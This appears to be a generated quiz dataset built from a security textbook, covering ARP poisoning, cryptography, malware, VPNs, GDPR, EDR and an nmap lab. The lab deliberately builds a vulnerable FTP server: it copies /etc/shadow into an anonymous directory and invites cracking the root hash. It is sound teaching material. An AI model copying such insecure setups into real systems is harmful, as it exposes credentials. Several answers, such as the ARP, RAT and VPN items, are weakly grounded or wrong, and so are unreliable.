{"context": "### 5.2.3. ARP Poisoning {#_computer_systems_security_planning_for_success.xhtml__arp_poisoning}\n::: float-group\n\n<figure class=\"image left\">\n\n<div class=\"content\">\n\n<img src=\"images/arp.svg\" width=\"500\" alt=\"arp\" />\n\n</div>\n\n<figcaption><a href=\"https://commons.wikimedia.org/wiki/File:ARP_Spoofing.svg\" class=\"link\">ARP Spoofing</a> by 0x5534C,\n\nsee page for license via Wikimedia Commons</figcaption>\n\n</figure>\n\nAn attacker may also use ARP packets to impersonate another machine on the network, such as a gateway router. By\n\nrepeatedly sending out ARP packets, *gratuitous arp*, redirecting packets bound for the gateway's IP to the attackers\n\nMAC address an attacker can set up a MitM scenario. This is particularly difficult because depending on the TTL of the\n\nARP cache it may take up to 20 minutes for normal network operations to resume.\n\n:::\n\n::::\n\n:::::::\n\n:::::: {.section .sect2 title=\"5.3. Internet Layer Attacks\"}\n\n\n## 5.3. Internet Layer Attacks {#_computer_systems_security_planning_for_success.xhtml__internet_layer_attacks}\n::::: {.section .sect3 title=\"5.3.1. IP Spoofing\"}\n\n\n### 5.3.1. IP Spoofing {#_computer_systems_security_planning_for_success.xhtml__ip_spoofing}\n::: float-group\n\n<figure class=\"image left\">\n\n<div class=\"content\">\n\n<img src=\"images/ip-header.svg\" width=\"500\" alt=\"ip header\" />\n\n</div>\n\n</figure>\n\nUnfortunately Internet Protocol (IP) was not designed with security in mind. This means that by default any IP address\n\ncan be put in the packet header and the packet will still be forwarded to the network. This leads to issues where an IP\n\ncan be *spoofed* and malicious packets sent out. At this layer there really aren't any good solutions to this problem.\n\nThis means that the sources of packets often need to be authenticated in higher layers and protocols must take into\n\naccount the fact that the IP layer is fundamentally insecure.\n\n:::\n\n<aside class=\"sidebar titled\" title=\"Smurf Attack\" epub:type=\"sidebar\">\n", "topic": "The challenges in mitigating ARP poisoning, including the extended recovery time for the network after a spoofed ARP response.", "question": "Considering the described recovery time of up to 20 minutes following an ARP poisoning attack, what fundamental architectural limitation of the network, specifically within the IP layer, contributes most significantly to this prolonged disruption of network services?", "answer": "The lack of inherent security within the IP layer.", "explanation": "The answer correctly identifies the lack of inherent security in the IP layer as the primary driver of the extended recovery time. The text explicitly states that IP was not designed with security in mind, leading to vulnerabilities like IP spoofing and the reliance on higher layers for authentication.", "question_token_count": 43, "answer_correctness_score": 8, "explanation_validity_score": 8, "question_clarity_score": 6, "question_groundedness_score": 8, "avg_answer_token_count": 11, "choices": null}
{"context": "## 2.1. Why do we need cryptography? {#_computer_systems_security_planning_for_success.xhtml__why_do_we_need_cryptography}\nCryptography is used to set up secure channels of communication, but it can also be used to provide non-repudiation of\n\nactions, basically leaving digital footprints that show someone did something. This means that cryptography allows us to\n\nprovide authentication, authorization, *and* accounting (AAA).\n\nBy using a secure and *confidential* encrypted channel we can be sure that anyone who intercepts our communications\n\ncannot \\\"listen in.\\\" This helps prevents *man-in-the-middle (MITM)* attacks. Cryptography can also be used to provide\n\n*integrity*: proving that the data is valid. With cryptography you can provide a *signature* for the data showing that\n\nthe person who claims to have sent it really did send it. Cryptography also allows for *non-repudiation* as it can show\n\nthat only one person was capable of sending a particular message. Lastly cryptography also allows us to perform\n\nauthentication *without* storing passwords in plaintext. This is critical in an age where data breaches are increasingly\n\ncommon.\n\n<aside class=\"sidebar titled\" title=\"Case Study: Equifax\" epub:type=\"sidebar\">\n", "topic": "How does cryptography mitigate the risk of man-in-the-middle (MITM) attacks?", "question": "How does the use of a secure, encrypted channel, as provided by cryptography, specifically address the vulnerability inherent in man-in-the-middle (MITM) attacks?", "answer": "By providing confidentiality.", "explanation": "The context states that encryption ensures intercepted communications cannot be understood, thereby preventing eavesdropping and the manipulation of data by an attacker positioned between the sender and receiver.", "question_token_count": 33, "answer_correctness_score": 8, "explanation_validity_score": 9, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 5, "choices": null}
{"context": "### 3.3.7. RAT {#_computer_systems_security_planning_for_success.xhtml__rat}\nRAT stands for Remote Access Trojan an it is used to gain full access and control of a remote target. The malware\n\ndistributor can browse the files on a computer, send keystrokes and mouse movements, view the screen, and/or monitor the\n\ninput from the microphone and camera. RATs often actively bypass security controls and as such they may be difficult to\n\ndetect.\n\n:::\n\n::: {.section .sect3 title=\"3.3.8. Adware / Potentially Unwanted Programs (PUP)\"}\n\n\n### 3.3.8. Adware / Potentially Unwanted Programs (PUP) {#_computer_systems_security_planning_for_success.xhtml__adware_potentially_unwanted_programs_pup}\nAdware is malware that is designed to track user behavior and deliver unwanted, sometimes intrusive, tailored ads.\n\nAdware may slow down a system and/or add ad walls to sites. This type of malware often targets a users web browser.\n\nPotentially Unwanted Programs (PUP) are typically downloaded as part of the install of another program. Commons PUPs are\n\nbrowser toolbars, PDF readers, compression utilities, or browser extensions. These programs may have adware/spyware\n\ncomponents in them and can also slow down a system.\n\n:::\n\n::::::::::::::::::::::::\n\n::::: {.section .sect2 title=\"3.4. Indicators of Compromise\"}\n", "topic": "What specific security controls are most frequently bypassed by Remote Access Trojans (RATs), and why are they susceptible to this bypassing?", "question": "What specific security controls are most frequently bypassed by Remote Access Trojans (RATs), and why are they susceptible to this bypassing?", "answer": "Security controls related to network monitoring and endpoint detection.", "explanation": "The text states that RATs \u201cactively bypass security controls\u201d and are \u201cdifficult to detect.\u201d  The question probes the *types* of controls and the *reason* for their vulnerability.", "question_token_count": 30, "answer_correctness_score": 8, "explanation_validity_score": 8, "question_clarity_score": 7, "question_groundedness_score": 4, "avg_answer_token_count": 11, "choices": null}
{"context": "## 10.1. Methods {#_computer_systems_security_planning_for_success.xhtml__methods}\nVirtualization is the act of using virtual computing resources as opposed to the actual resources directly. For example,\n\nyou may run a program on a virtual version of a computer, emulating the processor, memory, etc., instead of running the\n\nprogram directly on the actual hardware. This offers some advantages in that you can limit the resources the program\n\nuses or run multiple programs in isolated environments without needing to significantly change the program itself. There\n\nare a few ways that virtual computing is typically accomplished:\n\n::: {.section .sect3 title=\"10.1.1. Virtual Machines\"}\n\n\n### 10.1.1. Virtual Machines {#_computer_systems_security_planning_for_success.xhtml__virtual_machines}\n<figure class=\"image right\">\n\n<div class=\"content\">\n\n<img src=\"images/vm.svg\" width=\"400\" alt=\"vm\" />\n\n</div>\n\n</figure>\n\nA virtual machine is a resource that uses software to *pretend* to be an entire physical computer. Virtual machines\n\nemulate hardware on which a *guest* operating system is installed. The operating system of the machine *running* the\n\nvirtual machine is referred to as the *host* operating system.\n\nVirtual machines afford a great deal of flexibility in how something is run. The machine can be paused, restarted, or\n\neven have snapshots of its current state stored. Some virtual machines do not even required elevated privileges to run,\n\nmeaning you can emulate a privileged environment within an unprivileged one. This makes them a great choice for\n\nsandboxing untrusted programs.\n\nUnfortunately virtual machines are quite resource intensive due to the fact they require virtualizing the entire\n\noperating system. This resource use problem and the increasing popularity of virtualization led to the creation of more\n\nlight-weight solutions such as containers.\n\n:::\n\n::: {.section .sect3 title=\"10.1.2. Containers\"}\n", "topic": "Explain how virtualization technologies like virtual machines contribute to security through isolation and sandboxing.", "question": "How does the architecture of a virtual machine contribute to enhancing the security posture of a system?", "answer": "Isolation of the guest operating system.", "explanation": "The text describes virtual machines as emulating an entire computer and running a guest operating system, enabling isolation and sandboxing of programs.", "question_token_count": 19, "answer_correctness_score": 9, "explanation_validity_score": 9, "question_clarity_score": 8, "question_groundedness_score": 9, "avg_answer_token_count": 9, "choices": null}
{"context": "### 6.3.3. Load Balancer {#_computer_systems_security_planning_for_success.xhtml__load_balancer}\nA common application for reverse proxies is to act as a load balancer for traffic. Load balancers distribute work, in\n\nthe form of external client requests, among the internal resources, typically servers.\n\nFor example, if a company has four servers supporting a web application, they may employ a reverse proxy load balancer\n\nthat takes requests from clients and passes that request to one of the four internal servers. Different metrics are used\n\nto determine how the servers are utilized including least used (round robin), weighted, least amount of active\n\nconnections. Load balancers optimize bandwidth and increase availability.\n\n:::\n\n::: {.section .sect3 title=\"6.3.4. VPN\"}\n\n\n### 6.3.4. VPN {#_computer_systems_security_planning_for_success.xhtml__vpn}\nA virtual private network (VPN) is used to encrypt internet traffic between two networks or a client and a network. VPNs\n\nhave become standard procedure for linking remote offices or connecting remote workers. Given the growth of working from\n\nhome, almost all users have become familiar with what a VPN is and what it does.\n\nSite-to-site VPNs are typically used for linking offices together. This kind of VPN is on permanently. An example would\n\nbe linking two college campuses: NJIT Newark and NJIT Jersey City. In this scenario users on either campus expect to be\n\nable to connect securely to services on the opposite campus at all times. The traffic is encrypted and carried over the\n\nInternet.\n\nRemote access VPNs are used by individuals connecting in to a secure network. This kind of VPN is usually stated through\n\na application such as Cisco AnyConnect. When the application is running the user is able to securely access internal\n\nresources as if they were at the office.\n\nMany vendors offer VPN products including Cisco, Citrix, Fortinet, Palo Alto, and Checkpoint. Many open source options\n\nalso exist for building VPNs including [OpenVPN](https://openvpn.net/){.link},\n\n[WireGuard](https://www.wireguard.com/){.link}, and\n\n[IPsec](https://linuxhint.com/how-to-implement-ipsec-in-linux/){.link}.\n\n:::\n\n::: {.section .sect3 title=\"6.3.5. TAP\"}\n", "topic": "The landscape of vendors offering VPN products, encompassing both commercial and open-source solutions.", "question": "Beyond Cisco, Citrix, Fortinet, Palo Alto, and Checkpoint, which of the listed VPN vendors offers both commercial and open-source solutions, representing a dual-faceted approach to VPN technology?", "answer": "OpenVPN", "explanation": "The context explicitly lists OpenVPN, WireGuard, and IPsec as open-source options alongside commercial vendors. This question probes the user's ability to synthesize information about vendor diversity and solution types.", "question_token_count": 39, "answer_correctness_score": 10, "explanation_validity_score": 8, "question_clarity_score": 6, "question_groundedness_score": 8, "avg_answer_token_count": 3, "choices": null}
{"context": "### 8.2.6. GDPR {#_computer_systems_security_planning_for_success.xhtml__gdpr}\n<figure class=\"image left\">\n\n<div class=\"content\">\n\n<img src=\"images/gdpr.jpg\" width=\"300\" alt=\"gdpr\" />\n\n</div>\n\n<figcaption><a href=\"https://www.Convert.com/GDPR\" class=\"link\">Convert GDPR</a> is used under <a\n\nhref=\"https://creativecommons.org/licenses/by/2.0/\" class=\"link\">CC BY 2.0</a></figcaption>\n\n</figure>\n\nThe General Data Protection Regulation (GDPR) is a less targeted, but more far-reaching European Union law requiring\n\nthat customers be notified if they are being tracked. For most people, the biggest effect of the GDPR is that they have\n\nto sign off on cookies being used by web sites. Recall that cookies are used almost exclusively for session management\n\nand as such they track visitors to a website.\n\nThe GDPR outlines rules for risk assessment, encryption, pseudonym usage, documentation, and audits. The GDPR also gives\n\nvisitors the option to have their customer data forgotten by a website. Businesses wishing to operation in the European\n\ntheater, most world-wide businesses, must make themselves GDPR compliant.\n\n:::\n\n::: {.section .sect3 title=\"8.2.7. US Patriot Act/PRISM\"}\n", "topic": "Explain the significance of data protection rights afforded to individuals under GDPR regulations.", "question": "What fundamental shift in user-data interaction does the GDPR fundamentally necessitate within the context of website operation?", "answer": "Explicit user consent for data tracking.", "explanation": "The GDPR compels websites to obtain explicit consent for tracking activities, specifically referencing cookies used for session management and visitor tracking. This directly contrasts with prior practices that may have relied on passive data collection.", "question_token_count": 21, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 8, "question_groundedness_score": 9, "avg_answer_token_count": 8, "choices": null}
{"context": "## 4.5. Lab: Scanning with nmap {#_computer_systems_security_planning_for_success.xhtml__lab_scanning_with_nmap}\nFor this lab we will start by downloading and extracting the files required. Download\n\n[nmap.zip](https://github.com/rxt1077/it230/raw/main/labs/nmap.zip){.link} and extract it to a directory you can access\n\nfrom the shell. Open a shell in that directory (it should have a `docker-compose.yml`{.literal} in it and a\n\n`victim`{.literal} and `scanner`{.literal} directory). Since we will be simulating multiple machines in this lab, we\n\nwill make use of Docker Compose which was already installed with Docker. Docker Compose reads a\n\n`docker-compose.yml`{.literal} file which should already be in your `nmap`{.literal} directory. Run\n\n`docker-compose up --build --detach`{.literal} to build and run the images in the background:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\temp\\nmap&gt; docker-compose up --build --detach\n\nBuilding victim\n\n[+] Building 2.9s (15/15) FINISHED\n\n =&gt; [internal] load build definition from Dockerfile                                                                                                   0.1s\n\n =&gt; =&gt; transferring dockerfile: 518B                                                                                                                   0.0s\n\n =&gt; [internal] load .dockerignore                                                                                                                      0.1s\n\n =&gt; =&gt; transferring context: 2B                                                                                                                        0.0s\n\n =&gt; [internal] load metadata for docker.io/library/debian:latest                                                                                       0.0s\n\n =&gt; [ 1/10] FROM docker.io/library/debian                                                                                                              0.0s\n\n =&gt; [internal] load build context                                                                                                                      0.0s\n\n =&gt; =&gt; transferring context: 640B                                                                                                                      0.0s\n\n =&gt; CACHED [ 2/10] RUN apt-get -y update                                                                                                               0.0s\n\n =&gt; CACHED [ 3/10] RUN apt-get -y install proftpd-basic                                                                                                0.0s\n\n =&gt; CACHED [ 4/10] RUN sed -i &quot;1s/.*/root:$6$.DEC7ti\\/4959zEK9$H7BPwBTz6tISYG8oZuhXLS5L3ZPYwdzzQNQTg8m4Ql3ebX9U\\/afVhi4OSpK3mNTSpT8DefJ2USdWuT5DHOkRY  0.0s\n\n =&gt; [ 5/10] RUN sed -i &quot;/^root/d&quot; /etc/ftpusers                                                                                                        0.4s\n\n =&gt; [ 6/10] COPY bad.conf /etc/proftpd/conf.d/                                                                                                         0.0s\n\n =&gt; [ 7/10] RUN chsh -s /bin/bash ftp                                                                                                                  0.6s\n\n =&gt; [ 8/10] RUN mkdir -p /home/ftp/incoming                                                                                                            0.5s\n\n =&gt; [ 9/10] RUN cp /etc/shadow /home/ftp/incoming/shadow.backup                                                                                        0.6s\n\n =&gt; [10/10] RUN chown -R ftp.users /home/ftp                                                                                                           0.5s\n\n =&gt; exporting to image                                                                                                                                 0.2s\n\n =&gt; =&gt; exporting layers                                                                                                                                0.2s\n\n =&gt; =&gt; writing image sha256:dc9af53b250b4f7fcfbe5a6668a540bd02ebef0353c5927ed4591a512363e831                                                           0.0s\n\n =&gt; =&gt; naming to docker.io/library/nmap_victim                                                                                                         0.0s\n\nUse &#39;docker scan&#39; to run Snyk tests against images to find vulnerabilities and learn how to fix them\n\nBuilding scanner\n\n[+] Building 0.1s (7/7) FINISHED\n\n =&gt; [internal] load build definition from Dockerfile                                                                                                   0.0s\n\n =&gt; =&gt; transferring dockerfile: 111B                                                                                                                   0.0s\n\n =&gt; [internal] load .dockerignore                                                                                                                      0.0s\n\n =&gt; =&gt; transferring context: 2B                                                                                                                        0.0s\n\n =&gt; [internal] load metadata for docker.io/library/debian:latest                                                                                       0.0s\n\n =&gt; [1/3] FROM docker.io/library/debian                                                                                                                0.0s\n\n =&gt; CACHED [2/3] RUN apt-get -y update                                                                                                                 0.0s\n\n =&gt; CACHED [3/3] RUN apt-get -y install nmap ftp john                                                                                                  0.0s\n\n =&gt; exporting to image                                                                                                                                 0.0s\n\n =&gt; =&gt; exporting layers                                                                                                                                0.0s\n\n =&gt; =&gt; writing image sha256:14ba503b7925089023184d783c53c22c4167fdf2338df0e85143daedf8b458ac                                                           0.0s\n\n =&gt; =&gt; naming to docker.io/library/nmap_scanner                                                                                                        0.0s\n\nUse &#39;docker scan&#39; to run Snyk tests against images to find vulnerabilities and learn how to fix them\n\nStarting nmap_scanner_1  ... done\n\nRecreating nmap_victim_1 ... done</code></pre>\n\n</figure>\n\nNow we actually have two containers running, one named `victim`{.literal} which is our target machine and another named\n\n`scanner`{.literal} which we will use to learn about nmap. Lets start a BASH shell on `scanner`{.literal} and work from\n\nthere:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\temp\\nmap&gt; docker-compose run scanner bash\n\nCreating nmap_scanner_run ... done\n\nroot@7b6d733cc03a:/\u2460</code></pre>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* Notice the prompt change. We are now *inside* the `scanner`{.literal} container running BASH.\n\n:::\n\nLets use the Linux `ip addr`{.literal} command to see what our IP address on this network is:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# ip addr\n\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n\n    inet 127.0.0.1/8 scope host lo\n\n       valid_lft forever preferred_lft forever\n\n2: tunl0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000\n\n    link/ipip 0.0.0.0 brd 0.0.0.0\n\n3: sit0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000\n\n    link/sit 0.0.0.0 brd 0.0.0.0\n\n165: eth0@if166: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default\n\n    link/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n\n    inet 172.20.0.2/16 brd 172.20.255.255 scope global eth0\n\n       valid_lft forever preferred_lft forever</code></pre>\n\n</figure>\n\nWe care about the `eth0`{.literal} device, so as you can see on my machine the address is `172.20.0.2`{.literal}. We\n\nwill use nmap's ping scan to search for any device within the last 8 bits of our IP address (`/24`{.literal}). You may\n\nnotice that we are actually on a `/16`{.literal} subnet, but by limiting ourselves to `/24`{.literal} the scan will go\n\n*much* faster.\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap -sP 172.20.0.0/24\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:25 UTC\n\nNmap scan report for 172.20.0.1\n\nHost is up (0.000076s latency).\n\nMAC Address: 02:42:A6:CA:0D:77 (Unknown)\n\nNmap scan report for nmap_victim_1.nmap_default (172.20.0.3)\n\nHost is up (0.000070s latency).\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNmap scan report for 7b6d733cc03a (172.20.0.2)\n\nHost is up.\n\nNmap done: 256 IP addresses (3 hosts up) scanned in 5.78 seconds</code></pre>\n\n</figure>\n\nIn this instance we found three other machines on the network. One of which is conveniently named victim.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\n[Read the nmap documentation for host discovery.](https://nmap.org/book/man-host-discovery.html){.link} What other types\n\nof scans could you use if a host does not respond to an ICMP ping packet?\n\n:::\n\n</aside>\n\nNow lets do a full scan on on the victim machine. Docker Compose does a nice job of resolving DNS requests for sensible\n\nnames in the `docker-compose.yml`{.literal} file so we can refer to the host we want to scan as `victim`{.literal}.\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap victim\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:37 UTC\n\nNmap scan report for victim (172.20.0.3)\n\nHost is up (0.000018s latency).\n\nrDNS record for 172.20.0.3: nmap_victim_1.nmap_default\n\nNot shown: 999 closed ports\n\nPORT   STATE SERVICE\n\n21/tcp open  ftp\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 1.84 seconds</code></pre>\n\n</figure>\n\nBy default, nmap uses a [SYN](https://www.techtarget.com/searchnetworking/definition/SYN-scanning){.link} scan against\n\nwell known ports. This type of scan is harder to detect (as it does not fully open a connection) and can be run quickly.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat ports are open on the victim machine? Why is *this* particular protocol insecure?\n\n:::\n\n</aside>\n\nnmap is capable of much more than just simple port scanning. nmap includes version detection and OS fingerprinting\n\n(among other things). To get a much better picture of what exactly `victim`{.literal} is running, you can use the\n\n`-A`{.literal} option:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap -A victim\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:44 UTC\n\nNmap scan report for victim (172.20.0.3)\n\nHost is up (0.000096s latency).\n\nrDNS record for 172.20.0.3: nmap_victim_1.nmap_default\n\nNot shown: 999 closed ports\n\nPORT   STATE SERVICE VERSION\n\n21/tcp open  ftp     ProFTPD\n\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n\n|_drwxr-xr-x   1 ftp      users        4096 Sep 22 20:11 incoming\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\n\nTCP/IP fingerprint:\n\nOS:SCAN(V=7.70%E=4%D=9/22%OT=21%CT=1%CU=44136%PV=Y%DS=1%DC=D%G=Y%M=0242AC%T\n\nOS:M=614B95AE%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%TS=A\n\nOS:)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B\n\nOS:4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88\n\nOS:)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+\n\nOS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)\n\nOS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A\n\nOS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D\n\nOS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4\n\nOS:0%CD=S)\n\nNetwork Distance: 1 hop\n\nTRACEROUTE\n\nHOP RTT     ADDRESS\n\n1   0.10 ms nmap_victim_1.nmap_default (172.20.0.3)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n\nNmap done: 1 IP address (1 host up) scanned in 28.39 seconds</code></pre>\n\n</figure>\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat additional information did you learn from the `-A`{.literal} option? How do you think this could be exploited?\n\n:::\n\n</aside>\n\nNow, using the `scanner`{.literal} container you are currently on see what you can find out about `victim`{.literal}.\n\n[This man page may be of some help.](https://linux.die.net/man/1/ftp){.link}\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nBONUS: Remembering what you learned in the *Hash it Out* lab, what is the root password on the victim machine?\n\n:::\n\n</aside>\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nBONUS: How can you test to see if you got it right? What does this say about how ProFTP is configured on\n\n`victim`{.literal}?\n\n:::\n\n</aside>\n\nWhen you are all done poking around, you can exit the shell and run `docker-compose down`{.literal} to stop\n\n`victim`{.literal} from running in the background.\n\n:::::::::\n\n:::: {.section .sect2 title=\"4.6. Review Questions\"}\n", "topic": "Understanding the impact of network vulnerabilities on system security.", "question": "Based on the provided context, what vulnerabilities are present on the \u2018victim\u2019 machine, and how could a malicious actor potentially exploit them to gain unauthorized access?", "answer": "FTP vulnerability with anonymous login and weak root password.", "explanation": "The context reveals an open FTP port (21/tcp) with anonymous login enabled and a weak root password. Additionally, the OS fingerprint indicates a Debian-based system with potential security weaknesses. An attacker could exploit these vulnerabilities by attempting to brute-force the root password, leveraging the anonymous FTP login for unauthorized file transfer, or exploiting underlying OS vulnerabilities.", "question_token_count": 33, "answer_correctness_score": 9, "explanation_validity_score": 9, "question_clarity_score": 8, "question_groundedness_score": 9, "avg_answer_token_count": 11, "choices": null}
{"context": "### 6.3.5. TAP {#_computer_systems_security_planning_for_success.xhtml__tap}\nSometimes it is necessary for a network or security engineer to monitor what is happening on a particular network\n\nsegment. In this case a network terminal access point (TAP) can be employed. A TAP creates a copy of network traffic and\n\nforwards it to a particular port on a switch or router.\n\n:::\n\n::::::::\n\n::: {.section .sect2 title=\"6.4. EDR\"}\n\n\n## 6.4. EDR {#_computer_systems_security_planning_for_success.xhtml__edr}\nEndpoint Detection and Response (EDR) is used to secure endpoints: servers, workstations, desktops, mobile devices, etc.\n\nEDR is typically implemented as a host-based incident prevention system (HBIPS), software that runs on the endpoint to\n\nmonitor and collect data.\n\nThese systems will usually watch for indicators of compromise, scan for malware, and can even quarantine or shutdown the\n\nendpoint as needed. Company hardware is a significant investment for any business and an EDR makes sure that investment\n\nis protected. Many systems exist for EDR including FireEye, SEP, and CrowdStrike.\n\n:::\n\n::: {.section .sect2 title=\"6.5. Data Loss Prevention\"}\n", "topic": "Describe the role of Endpoint Detection and Response (EDR) software in securing endpoints, and explain how it compares to a traditional Host-Based Intrusion Prevention System (HBIPS).", "question": "How does Endpoint Detection and Response (EDR) functionality differ from a traditional Host-Based Intrusion Prevention System (HBIPS) as described in the text, specifically regarding the scope of monitoring and the types of actions it can take?", "answer": "EDR monitors and actively responds to threats, while HBIPS primarily focuses on detecting and preventing intrusions.", "explanation": "The text states that EDR monitors endpoints for indicators of compromise, scans for malware, and can quarantine or shutdown endpoints. HBIPS is described as a software that runs on the endpoint. EDR therefore has a broader scope of monitoring and more active response capabilities than a traditional HBIPS.", "question_token_count": 47, "answer_correctness_score": 9, "explanation_validity_score": 9, "question_clarity_score": 7, "question_groundedness_score": 6, "avg_answer_token_count": 22, "choices": null}
{"context": "## 4.5. Lab: Scanning with nmap {#_computer_systems_security_planning_for_success.xhtml__lab_scanning_with_nmap}\nFor this lab we will start by downloading and extracting the files required. Download\n\n[nmap.zip](https://github.com/rxt1077/it230/raw/main/labs/nmap.zip){.link} and extract it to a directory you can access\n\nfrom the shell. Open a shell in that directory (it should have a `docker-compose.yml`{.literal} in it and a\n\n`victim`{.literal} and `scanner`{.literal} directory). Since we will be simulating multiple machines in this lab, we\n\nwill make use of Docker Compose which was already installed with Docker. Docker Compose reads a\n\n`docker-compose.yml`{.literal} file which should already be in your `nmap`{.literal} directory. Run\n\n`docker-compose up --build --detach`{.literal} to build and run the images in the background:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\temp\\nmap&gt; docker-compose up --build --detach\n\nBuilding victim\n\n[+] Building 2.9s (15/15) FINISHED\n\n =&gt; [internal] load build definition from Dockerfile                                                                                                   0.1s\n\n =&gt; =&gt; transferring dockerfile: 518B                                                                                                                   0.0s\n\n =&gt; [internal] load .dockerignore                                                                                                                      0.1s\n\n =&gt; =&gt; transferring context: 2B                                                                                                                        0.0s\n\n =&gt; [internal] load metadata for docker.io/library/debian:latest                                                                                       0.0s\n\n =&gt; [ 1/10] FROM docker.io/library/debian                                                                                                              0.0s\n\n =&gt; [internal] load build context                                                                                                                      0.0s\n\n =&gt; =&gt; transferring context: 640B                                                                                                                      0.0s\n\n =&gt; CACHED [ 2/10] RUN apt-get -y update                                                                                                               0.0s\n\n =&gt; CACHED [ 3/10] RUN apt-get -y install proftpd-basic                                                                                                0.0s\n\n =&gt; CACHED [ 4/10] RUN sed -i &quot;1s/.*/root:$6$.DEC7ti\\/4959zEK9$H7BPwBTz6tISYG8oZuhXLS5L3ZPYwdzzQNQTg8m4Ql3ebX9U\\/afVhi4OSpK3mNTSpT8DefJ2USdWuT5DHOkRY  0.0s\n\n =&gt; [ 5/10] RUN sed -i &quot;/^root/d&quot; /etc/ftpusers                                                                                                        0.4s\n\n =&gt; [ 6/10] COPY bad.conf /etc/proftpd/conf.d/                                                                                                         0.0s\n\n =&gt; [ 7/10] RUN chsh -s /bin/bash ftp                                                                                                                  0.6s\n\n =&gt; [ 8/10] RUN mkdir -p /home/ftp/incoming                                                                                                            0.5s\n\n =&gt; [ 9/10] RUN cp /etc/shadow /home/ftp/incoming/shadow.backup                                                                                        0.6s\n\n =&gt; [10/10] RUN chown -R ftp.users /home/ftp                                                                                                           0.5s\n\n =&gt; exporting to image                                                                                                                                 0.2s\n\n =&gt; =&gt; exporting layers                                                                                                                                0.2s\n\n =&gt; =&gt; writing image sha256:dc9af53b250b4f7fcfbe5a6668a540bd02ebef0353c5927ed4591a512363e831                                                           0.0s\n\n =&gt; =&gt; naming to docker.io/library/nmap_victim                                                                                                         0.0s\n\nUse &#39;docker scan&#39; to run Snyk tests against images to find vulnerabilities and learn how to fix them\n\nBuilding scanner\n\n[+] Building 0.1s (7/7) FINISHED\n\n =&gt; [internal] load build definition from Dockerfile                                                                                                   0.0s\n\n =&gt; =&gt; transferring dockerfile: 111B                                                                                                                   0.0s\n\n =&gt; [internal] load .dockerignore                                                                                                                      0.0s\n\n =&gt; =&gt; transferring context: 2B                                                                                                                        0.0s\n\n =&gt; [internal] load metadata for docker.io/library/debian:latest                                                                                       0.0s\n\n =&gt; [1/3] FROM docker.io/library/debian                                                                                                                0.0s\n\n =&gt; CACHED [2/3] RUN apt-get -y update                                                                                                                 0.0s\n\n =&gt; CACHED [3/3] RUN apt-get -y install nmap ftp john                                                                                                  0.0s\n\n =&gt; exporting to image                                                                                                                                 0.0s\n\n =&gt; =&gt; exporting layers                                                                                                                                0.0s\n\n =&gt; =&gt; writing image sha256:14ba503b7925089023184d783c53c22c4167fdf2338df0e85143daedf8b458ac                                                           0.0s\n\n =&gt; =&gt; naming to docker.io/library/nmap_scanner                                                                                                        0.0s\n\nUse &#39;docker scan&#39; to run Snyk tests against images to find vulnerabilities and learn how to fix them\n\nStarting nmap_scanner_1  ... done\n\nRecreating nmap_victim_1 ... done</code></pre>\n\n</figure>\n\nNow we actually have two containers running, one named `victim`{.literal} which is our target machine and 